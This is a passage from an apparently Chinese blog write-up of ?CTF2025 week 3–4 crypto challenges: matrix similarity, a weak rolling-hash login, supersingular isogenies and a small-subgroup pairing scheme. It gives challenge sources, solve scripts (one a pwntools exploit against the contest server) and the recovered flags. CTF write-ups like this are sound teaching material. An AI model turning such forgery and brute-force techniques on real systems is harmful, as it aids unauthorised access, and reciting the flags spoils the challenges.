class="number">76</span>],</span><br><span class="line">    [<span class="number">112</span>, <span class="number">122</span>, <span class="number">165</span>, <span class="number">137</span>, <span class="number">67</span>, <span class="number">164</span>],</span><br><span class="line">    [<span class="number">29</span>, <span class="number">148</span>, <span class="number">80</span>, <span class="number">173</span>, <span class="number">33</span>, <span class="number">72</span>],</span><br><span class="line">    [<span class="number">92</span>, <span class="number">101</span>, <span class="number">143</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">109</span>]</span><br><span class="line">]</span><br><span class="line">D = Matrix(F, D_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 单位矩阵</span></span><br><span class="line">I = identity_matrix(F, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) 在 GF(251) 中寻找所有特征值 lambda 使 det(D - lambda*I) = 0</span></span><br><span class="line">eigenvals = []</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(p):</span><br><span class="line">    lam = F(a)</span><br><span class="line">    <span class="keyword">if</span> (D - lam*I).det() == <span class="number">0</span>:</span><br><span class="line">        eigenvals.append(lam)</span><br><span class="line">eigenvals = <span class="built_in">list</span>(eigenvals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;eigenvalues:&quot;</span>, eigenvals)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 对于每个特征值，求一个特征向量（取右核空间的一个基向量）</span></span><br><span class="line">eigvecs = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> lam <span class="keyword">in</span> eigenvals:</span><br><span class="line">    K = (D - lam*I).right_kernel()   <span class="comment"># kernel as vector space over F</span></span><br><span class="line">    basis = K.basis()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(basis) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;No eigenvector for lambda = %s&quot;</span> % lam)</span><br><span class="line">    v = basis[<span class="number">0</span>]  <span class="comment"># 取第一基向量</span></span><br><span class="line">    <span class="comment"># 标准化为长度6向量（Sage 的向量用 field 元素）</span></span><br><span class="line">    eigvecs[<span class="built_in">int</span>(lam)] = v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) 对每个特征向量尝试所有非零标量 s，使结果所有条目都是可打印 ASCII (32..126)</span></span><br><span class="line">printable = <span class="built_in">set</span>(<span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>))</span><br><span class="line">scalar_options = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> lam_int, v <span class="keyword">in</span> eigvecs.items():</span><br><span class="line">    v = v  <span class="comment"># vector over F</span></span><br><span class="line">    opts = []  <span class="comment"># 列表 of (s_int, vector_as_list_of_ints)</span></span><br><span class="line">    <span class="keyword">for</span> s_int <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, p):</span><br><span class="line">        s = F(s_int)</span><br><span class="line">        vec = s * v</span><br><span class="line">        <span class="comment"># 将 vec 转成整数列表（0..250）</span></span><br><span class="line">        vec_ints = [Integer(x) <span class="keyword">for</span> x <span class="keyword">in</span> vec]</span><br><span class="line">        <span class="comment"># 检查是否都在 printable 范围</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">32</span> &lt;= <span class="built_in">int</span>(x) &lt;= <span class="number">126</span> <span class="keyword">for</span> x <span class="keyword">in</span> vec_ints):</span><br><span class="line">            opts.append((s_int, vec_ints))</span><br><span class="line">    scalar_options[lam_int] = opts</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;lambda&quot;</span>, lam_int, <span class="string">&quot;options:&quot;</span>, <span class="built_in">len</span>(opts))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4) 暴力枚举：对特征值的列排列和每列选择标量</span></span><br><span class="line">lam_list = <span class="built_in">list</span>(eigvecs.keys())</span><br><span class="line">opts_scalars = &#123;lam: [s <span class="keyword">for</span> s, _ <span class="keyword">in</span> scalar_options[lam]] <span class="keyword">for</span> lam <span class="keyword">in</span> lam_list&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_B_from_assignment</span>(<span class="params">order, scalars</span>):</span><br><span class="line">    <span class="comment"># order: list of lambda ints for columns 0..5</span></span><br><span class="line">    <span class="comment"># scalars: list of scalar ints corresponding to order</span></span><br><span class="line">    cols = []</span><br><span class="line">    <span class="keyword">for</span> lam_int, s_int <span class="keyword">in</span> <span class="built_in">zip</span>(order, scalars):</span><br><span class="line">        <span class="comment"># 找到对应向量</span></span><br><span class="line">        opts = scalar_options[lam_int]</span><br><span class="line">        <span class="comment"># 找索引并取向量</span></span><br><span class="line">        idx = opts_scalars[lam_int].index(s_int)</span><br><span class="line">        vec_ints = opts[idx][<span class="number">1</span>]</span><br><span class="line">        cols.append(vec_ints)</span><br><span class="line">    <span class="comment"># columns are lists of length 6; we need a 6x6 matrix in column-major</span></span><br><span class="line">    <span class="comment"># build matrix as list of rows</span></span><br><span class="line">    rows = []</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        row = [cols[c][r] <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line">        rows.append(row)</span><br><span class="line">    <span class="keyword">return</span> rows  <span class="comment"># 返回普通整型行列表（6x6）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索</span></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> perm <span class="keyword">in</span> permutations(lam_list):</span><br><span class="line">    lists = [opts_scalars[lam] <span class="keyword">for</span> lam <span class="keyword">in</span> perm]</span><br><span class="line">    <span class="comment"># 若某列没有可行标量，则跳过该排列</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(<span class="built_in">len</span>(l) == <span class="number">0</span> <span class="keyword">for</span> l <span class="keyword">in</span> lists):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> scalars <span class="keyword">in</span> product(*lists):</span><br><span class="line">        B_rows = build_B_from_assignment(perm, scalars)</span><br><span class="line">        <span class="comment"># 展平为行主序的 36 字节</span></span><br><span class="line">        flat = []</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">                flat.append(<span class="built_in">int</span>(B_rows[r][c]) % p)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag_bytes = <span class="built_in">bytes</span>(flat)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> flag_bytes.startswith(<span class="string">b&#x27;flag&#123;&#x27;</span>) <span class="keyword">and</span> flag_bytes.endswith(<span class="string">b&#x27;&#125;&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Found flag:&quot;</span>, flag_bytes)</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> found:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No flag found with current search.&quot;</span>)</span><br><span class="line"><span class="comment"># [+] Found flag: b&#x27;flag&#123;3Njoy_My_eZ_m4tr1x_5imi1aRi7y!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Week4-Xaleid◆scopiX"><a href="#Week4-Xaleid◆scopiX" class="headerlink" title="[Week4] Xaleid◆scopiX"></a>[Week4] Xaleid◆scopiX</h2><p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;/home/ctf/flag&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">basis = random.randint(<span class="number">2</span>,(<span class="number">1</span>&lt;&lt;<span class="number">128</span>)-<span class="number">2</span>)</span><br><span class="line">prime = getPrime(<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">kaleidoscope</span>(<span class="params">msg</span>):</span><br><span class="line">    r = basis</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> msg:</span><br><span class="line">        r = r * prime % (<span class="number">1</span> &lt;&lt; <span class="number">128</span>)</span><br><span class="line">        r = r ^ i</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">i</span>):</span><br><span class="line">    key = os.urandom(random.randint(<span class="number">64</span>,<span class="number">128</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Hello! Your gift:&#x27;</span>, kaleidoscope(key))</span><br><span class="line">    s1 = <span class="built_in">input</span>(<span class="string">&#x27;Tell me your name: &#x27;</span>).encode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Hello,&#x27;</span>, kaleidoscope(s1), <span class="string">&#x27;! Let\&#x27;s sign in!&#x27;</span>)</span><br><span class="line">    s2 = <span class="built_in">input</span>(<span class="string">&#x27;Your account: &#x27;</span>).encode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Your account:&#x27;</span>, kaleidoscope(s2))</span><br><span class="line">    s3 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Your password: &#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> s3:</span><br><span class="line">        <span class="keyword">if</span> s3 == kaleidoscope(s1 + key + s2):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Sign in successfully!&#x27;</span>)</span><br><span class="line">            s4 = <span class="built_in">input</span>(<span class="string">&#x27;Your operation: &#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> s4 == <span class="string">&#x27;flag&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> s2 == <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;Permission deny&#x27;</span>)</span><br><span class="line">            <span class="keyword">elif</span> s4 == <span class="string">&#x27;logout&#x27;</span> <span class="keyword">and</span> i:</span><br><span class="line">                main(i-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Unknown operation&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Password incorrect!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据源码可以知道，s1留空可以得到<code>basis</code></p>
<p>s2传入<code>\x00</code>，即可得到<code>basis * prime mod (1 &lt;&lt; 128)</code>，接着求<code>basis</code>在<code>(1 &lt;&lt; 128)</code>上的逆元，可以求出<code>prime</code></p>
<p>接着算出<code>s3</code>的值，<code>key*s2 mod (1 &lt;&lt; 128)</code>即可</p>
<p>然后输入<code>logout</code>获取下一次main的执行，在这次，s1依然留空，已知<code>basis</code>和<code>prime</code>，可以在得到<code>key</code>的值后往后追加字符串继续计算，最后得到s3</p>
<p>算出结果发过去，此时输入<code>flag</code>即可获得flag</p>
<p>需要注意，<code>basis</code>要为奇数</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># challenge.ilovectf.cn:30283</span></span><br><span class="line">sh = remote(<span class="string">&quot;challenge.ilovectf.cn&quot;</span>, <span class="number">30283</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_bytes</span>(<span class="params">r,msg</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> msg:</span><br><span class="line">        r = r * prime % (<span class="number">1</span> &lt;&lt; <span class="number">128</span>)</span><br><span class="line">        r = r ^ i</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;gift:&#x27;</span>)</span><br><span class="line">key = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">s1 = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;account:&#x27;</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;account:&#x27;</span>)</span><br><span class="line">s2 = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line"></span><br><span class="line">basis = s1</span><br><span class="line"></span><br><span class="line">inv = <span class="built_in">pow</span>(basis,-<span class="number">1</span>,<span class="number">1</span>&lt;&lt;<span class="number">128</span>)</span><br><span class="line">prime = s2*inv % (<span class="number">1</span>&lt;&lt;<span class="number">128</span>)</span><br><span class="line">password = key*s2*inv% (<span class="number">1</span>&lt;&lt;<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;password: &#x27;</span>,<span class="built_in">str</span>(password))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;operation: &#x27;</span>,<span class="string">&#x27;logout&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;gift:&#x27;</span>)</span><br><span class="line">key = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;account:&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">password = add_bytes(key,<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;password: &#x27;</span>,<span class="built_in">str</span>(password))</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;operation: &#x27;</span>,<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Week4-Myneighbors"><a href="#Week4-Myneighbors" class="headerlink" title="[Week4] Myneighbors"></a>[Week4] Myneighbors</h2><p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> magical_num, flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"></span><br><span class="line">p = <span class="number">431</span></span><br><span class="line">F.&lt;i&gt; = GF(p^<span class="number">2</span>, modulus = x^<span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line">E = EllipticCurve(j=F(magical_num))</span><br><span class="line"><span class="keyword">assert</span> E.is_supersingular()</span><br><span class="line"></span><br><span class="line">P = E(<span class="number">0</span>).division_points(<span class="number">2</span>)[<span class="number">1</span>:]</span><br><span class="line">neighbors = []</span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>((P))):</span><br><span class="line">    phi = E.isogeny(P[idx])</span><br><span class="line">    EE = phi.codomain()</span><br><span class="line">    neighbors.append(EE.j_invariant())</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> E.j_invariant() <span class="keyword">in</span> neighbors</span><br><span class="line"></span><br><span class="line">P = E(<span class="number">0</span>).division_points(<span class="number">3</span>)[<span class="number">1</span>:]</span><br><span class="line">shuffle(P)</span><br><span class="line"></span><br><span class="line">phi = E.isogeny(P[<span class="number">0</span>])</span><br><span class="line">E = phi.codomain()</span><br><span class="line">H = hashlib.md5(<span class="built_in">str</span>(E.j_invariant()).encode()).hexdigest().encode()</span><br><span class="line">key, iv = H[:<span class="number">16</span>], H[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">cipher = aes.encrypt(pad(flag, <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;cipher: <span class="subst">&#123;cipher.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#cipher: 49e90a91357fef12c54234b3cb553bb2fdd61f2af8c7e78b3d5ffdeac7022af0</span></span><br></pre></td></tr></table></figure>

<p>不需要多想，爆破<code>magical_num</code>即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"></span><br><span class="line">p = <span class="number">431</span></span><br><span class="line">cipher = <span class="string">&#x27;49e90a91357fef12c54234b3cb553bb2fdd61f2af8c7e78b3d5ffdeac7022af0&#x27;</span></span><br><span class="line">F.&lt;i&gt; = GF(p^<span class="number">2</span>, modulus = x^<span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> magical_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    E = EllipticCurve(j=F(magical_num))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> E.is_supersingular():</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    P = E(<span class="number">0</span>).division_points(<span class="number">2</span>)[<span class="number">1</span>:]</span><br><span class="line">    neighbors = []</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>((P))):</span><br><span class="line">        phi = E.isogeny(P[idx])</span><br><span class="line">        EE = phi.codomain()</span><br><span class="line">        neighbors.append(EE.j_invariant())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> E.j_invariant() <span class="keyword">in</span> neighbors:</span><br><span class="line">        <span class="built_in">print</span>(magical_num)</span><br><span class="line">        P = E(<span class="number">0</span>).division_points(<span class="number">3</span>)[<span class="number">1</span>:]</span><br><span class="line">        shuffle(P)</span><br><span class="line">        phi = E.isogeny(P[<span class="number">0</span>])</span><br><span class="line">        E = phi.codomain()</span><br><span class="line">        H = hashlib.md5(<span class="built_in">str</span>(E.j_invariant()).encode()).hexdigest().encode()</span><br><span class="line">        key, iv = H[:<span class="number">16</span>], H[<span class="number">16</span>:]</span><br><span class="line">        aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">        flag = aes.decrypt(<span class="built_in">bytes</span>.fromhex(cipher))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;I_@m_4_n31gh80r_0f_my53lf&#125;\x01&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Week4-linear-function"><a href="#Week4-linear-function" class="headerlink" title="[Week4] linear function?"></a>[Week4] linear function?</h2><p>源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">P = <span class="number">208351617316091241234326746312124448251235562226470491514186331217050270460481</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pairing</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> (a * b) % P</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modexp</span>(<span class="params">base, exp</span>):  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(base, exp, P)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_hash</span>(<span class="params">msg: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> (bytes_to_long(msg)+q*<span class="number">114514114514</span>)% P   </span><br><span class="line"></span><br><span class="line">q = ?? <span class="comment">#small number</span></span><br><span class="line"></span><br><span class="line">g1 = <span class="built_in">pow</span>(random.randint(<span class="number">2</span>, P-<span class="number">1</span>), (P-<span class="number">1</span>)//q, P)</span><br><span class="line">g2 = <span class="built_in">pow</span>(random.randint(<span class="number">2</span>, P-<span class="number">1</span>), (P-<span class="number">1</span>)//q, P)</span><br><span class="line">x = random.randint(<span class="number">2</span>, q-<span class="number">1</span>)</span><br><span class="line">y = random.randint(<span class="number">2</span>, q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pk1 = modexp(g1, x)</span><br><span class="line">pk2 = modexp(g2, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">m = fake_hash(flag)</span><br><span class="line">c1 = modexp(m, y)</span><br><span class="line">c2 = <span class="built_in">pow</span>(pairing(m, g2), x, P)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;g1 =&quot;</span>, g1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;g2 =&quot;</span>, g2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pk1 =&quot;</span>, pk1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pk2 =&quot;</span>, pk2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>, c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>, c2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">g1 = 165341976123736548335459112293962522231127264153295903604264502197418873026337</span></span><br><span class="line"><span class="string">g2 = 170915747120703530230385586293442518689765397278386308589786290207533442146523</span></span><br><span class="line"><span class="string">pk1 = 11589158479692898111868014330824763021736695091380856551306940309853826892678</span></span><br><span class="line"><span class="string">pk2 = 56614577954354505447188182303177869506146009993379305915003210547359661002599</span></span><br><span class="line"><span class="string">c1 = 203767997651769026611878084970895835495584375049533533997092667742078368771381</span></span><br><span class="line"><span class="string">c2 = 42280289742972723242969330279542671973937468908942256409868101442841553691921</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>因为<code>q</code>很小，所以x和y也很小，爆破出x和y，然后有限开方得到m</p>
<p>爆破出q的值即可解出flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modexp</span>(<span class="params">base, exp</span>):  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(base, exp, P)</span><br><span class="line"></span><br><span class="line">P = <span class="number">208351617316091241234326746312124448251235562226470491514186331217050270460481</span></span><br><span class="line">g1 = <span class="number">165341976123736548335459112293962522231127264153295903604264502197418873026337</span></span><br><span class="line">g2 = <span class="number">170915747120703530230385586293442518689765397278386308589786290207533442146523</span></span><br><span class="line">pk1 = <span class="number">11589158479692898111868014330824763021736695091380856551306940309853826892678</span></span><br><span class="line">pk2 = <span class="number">56614577954354505447188182303177869506146009993379305915003210547359661002599</span></span><br><span class="line">c1 = <span class="number">203767997651769026611878084970895835495584375049533533997092667742078368771381</span></span><br><span class="line">c2 = <span class="number">42280289742972723242969330279542671973937468908942256409868101442841553691921</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">100</span>):</span><br><span class="line">    tmp_pk1 = modexp(g1, i)</span><br><span class="line">    tmp_pk2 = modexp(g2, i)</span><br><span class="line">    <span class="keyword">if</span> tmp_pk1 == pk1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;x =&quot;</span>,i)</span><br><span class="line">        x = i</span><br><span class="line">    <span class="keyword">if</span> tmp_pk2 == pk2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;y =&quot;</span>,i)</span><br><span class="line">        y = i</span><br><span class="line"></span><br><span class="line">PR.&lt;m&gt; = PolynomialRing(Zmod(P))</span><br><span class="line">f = m^y - c1</span><br><span class="line">resy = f.roots()</span><br><span class="line"><span class="comment"># print(resy)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> resy:</span><br><span class="line">    tmp = i[<span class="number">0</span>]</span><br><span class="line">    flag = long_to_bytes(<span class="built_in">int</span>(tmp))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        m = tmp</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            m -= <span class="number">114514114514</span></span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line">            flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">            <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(cnt,flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 101 b&#x27;flag&#123;pair1n9_13_s000_fun&#125;&#x27;</span></span><br></pre></td></tr></table></figure>







</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/write-up/">write up</a></div><div class="post_share"><div class="social-share" data-image="/%EF%BC%9FCTF2025_week3&amp;week4_WP/%E5%B0%81%E9%9D%A2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/%EF%BC%9FCTF2025_week1&amp;week2_WP/" title="?CTF2025_week1&amp;week2_WP"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&amp;week2_WP/%E5%B0%81%E9%9D%A2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">?CTF2025_week1&amp;week2_WP</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/0xGame-week1/" title="0xGame_week1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/banner.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-08</div><div class="title">0xGame_week1</div></div></a></div><div><a href="/2025H&NCTF_WP/" title="2025H&amp;NCTF WP"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./2025H&NCTF/%E5%B0%81%E9%9D%A2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-08</div><div class="title">2025H&amp;NCTF WP</div></div></a></div><div><a href="/DASCTF/" title="DASCTF"><img class="cover" src= 